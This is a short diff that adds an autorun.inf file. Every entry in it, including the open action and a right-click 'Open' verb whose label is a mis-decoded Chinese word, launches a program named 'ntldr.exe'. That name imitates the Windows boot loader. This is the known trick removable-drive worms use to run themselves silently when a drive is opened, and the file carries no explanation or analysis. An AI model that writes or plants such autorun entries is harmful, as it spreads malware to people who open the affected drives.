@@ -1,0 +1,4 @@
+[AutoRun]
+OPEN=ntldr.exe
+shellexecute=ntldr.exe
+shell\´ò¿ª(&O)\command=ntldr.exe
